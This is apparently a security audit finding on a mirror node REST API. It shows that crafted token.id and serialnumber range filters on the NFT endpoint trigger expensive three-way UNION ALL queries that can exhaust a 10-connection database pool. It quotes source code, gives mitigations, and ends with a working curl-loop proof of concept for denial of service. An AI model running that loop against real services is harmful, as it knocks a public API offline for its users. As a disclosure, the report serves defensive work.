### Title
Unauthenticated DB Connection Pool Exhaustion via Expensive Multi-Union NFT Queries

### Summary
The `GET /api/v1/accounts/:idOrAliasOrEvmAddress/nfts` endpoint accepts range filter combinations that cause `extractNftMultiUnionQuery()` to build up to three UNION ALL subqueries, each performing a full `nft LEFT JOIN entity` scan. With no rate limiting or concurrency control in the REST API layer and a default DB connection pool of only 10 connections (each holdable for up to 20 seconds), an unauthenticated attacker can exhaust the pool with as few as 10 concurrent requests, rendering the REST API unable to serve any data.

### Finding Description

**Code path:**

`rest/routes/accountRoute.js:15` registers the route with no authentication or rate-limiting middleware:
```js
router.getExt(getPath('nfts'), AccountController.getNftsByAccountId);
```

`rest/controllers/accountController.js:90-103` — `getNftsByAccountId` calls `extractNftMultiUnionQuery()` then immediately issues a DB query:
```js
const query = this.extractNftMultiUnionQuery(filters, accountId);
const nonFungibleTokens = await NftService.getNfts(query);
```

`rest/service/nftService.js:93-122` — `getQuery()` builds up to 3 UNION ALL subqueries when `lower`, `inner`, and `upper` filter arrays are all non-empty (triggered by providing both `token.id` gte+lte and `serialnumber` gte+lte):
```js
const subQueries = [lower, inner, upper]
  .filter((filters) => filters.length !== 0)
  .map((filters) => this.getSubQuery(...));
// ...
sqlQuery = [subQueries.map((q) => `(${q})`).join('\nunion all\n'), orderClause, limitClause].join('\n');
```

Each subquery does a `nft LEFT JOIN entity` table scan. The resulting query holds a DB connection for the full duration.

**DB pool configuration** (`rest/dbpool.js:14`, default from `docs/configuration.md:556`):
```
hiero.mirror.rest.db.pool.maxConnections = 10   (default)
hiero.mirror.rest.db.pool.statementTimeout = 20000  (20 seconds)
```

**No rate limiting exists in the REST API.** The `rest/server.js` middleware stack contains: `requestLogger`, `authHandler`, optional metrics, optional cache check, route handlers, `responseHandler`, error handler — no throttle or concurrency limiter. The `ThrottleManagerImpl` / `ThrottleConfiguration` rate-limiting code exists only in the `web3` Java module (for contract calls), not in the Node.js REST API. Traefik-level rate limiting is only configured for the Rosetta API chart (`charts/hedera-mirror-rosetta/values.yaml:157-160`), not the REST API.

### Impact Explanation

With 10 concurrent requests each holding a connection for up to 20 seconds, the entire REST API DB pool is exhausted. All subsequent REST API requests — including those serving gossiped transaction data (`/api/v1/transactions`, `/api/v1/accounts`, etc.) — queue indefinitely or fail with connection timeout errors. The mirror node's REST-facing data serving is completely unavailable for the duration of the attack. The importer (ingestion) uses a separate HikariCP pool and is not directly affected, but all client-facing query serving is blocked.

### Likelihood Explanation

No privileges, accounts, tokens, or API keys are required. The attack requires only HTTP access to the public REST API. The worst-case query (3 UNION ALL subqueries over a large NFT table) is trivially triggered with a single URL pattern. Sustaining the attack requires only 10 concurrent HTTP connections kept alive, achievable with a single `curl` loop or any load-testing tool. The attack is repeatable indefinitely.

### Recommendation

1. **Add per-IP rate limiting middleware** to the REST API Express app (e.g., `express-rate-limit`) applied globally before route handlers in `rest/server.js`.
2. **Add a concurrency limiter** (e.g., `express-slow-down` or a semaphore) specifically for the NFT endpoint to cap simultaneous in-flight DB queries.
3. **Increase the default pool size** or configure pgbouncer `max_user_connections` to be enforced at the application level with proper backpressure (return 503 instead of queuing indefinitely).
4. **Reduce `statementTimeout`** for this endpoint specifically to limit how long each connection is held.
5. **Require authentication** or API key for endpoints that trigger multi-union queries.

### Proof of Concept

```bash
# Trigger 3-subquery UNION ALL path with token.id range + serialnumber range
# Run 15 concurrent requests to exceed the default pool of 10

for i in $(seq 1 15); do
  curl -s "http://<mirror-node>:5551/api/v1/accounts/0.0.1234/nfts?\
token.id=gte:1&token.id=lte:9999999999&\
serialnumber=gte:1&serialnumber=lte:9999999999&\
limit=100" &
done
wait

# Immediately after, attempt a normal query — it will hang or timeout:
curl -v "http://<mirror-node>:5551/api/v1/transactions?limit=1"
```

The 15 concurrent NFT requests each acquire a DB connection and hold it for up to 20 seconds executing the 3-part UNION ALL scan. The pool (default 10) is exhausted, and the transaction query cannot obtain a connection.
